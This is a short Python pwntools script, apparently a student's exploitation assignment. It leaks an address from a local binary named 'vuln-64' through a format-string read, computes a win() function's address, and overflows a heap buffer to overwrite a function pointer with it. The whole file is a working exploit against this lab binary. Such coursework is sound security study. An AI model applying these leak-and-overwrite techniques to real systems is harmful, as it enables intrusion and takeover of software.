# Maximiliano brizzio
# I pledge my honor that I have abided by the Stevens Honor System.



from pwn import *

context(os='linux', arch='amd64')
io = process('./vuln-64')

#win address offset
win_offset = 331

#gets address of win()
io.sendline(b'%11$p')
vfunc_ret_addr = int(io.recvline()[:-1], 16)
win_addr = vfunc_ret_addr - win_offset

print("win: ", hex(win_addr))

#creating the exploit
    # start address of d->buffer
buf_addr = 0x5555555592a0

    # address of f->fp
fp_addr = 0x555555559330

buf_fp_offset = 144

oflow = b'A' * buf_fp_offset

exploit = bytearray(oflow)
exploit.extend(win_addr.to_bytes(8, byteorder='little'))
#reaping lines to show next iteration's output
io.recvline()
io.recvline()
print("sending exploit: ", exploit)
io.sendline(exploit)

#reaping more junk
io.recvline()
output = io.recvline()
print("Output: ", output)

io.close()


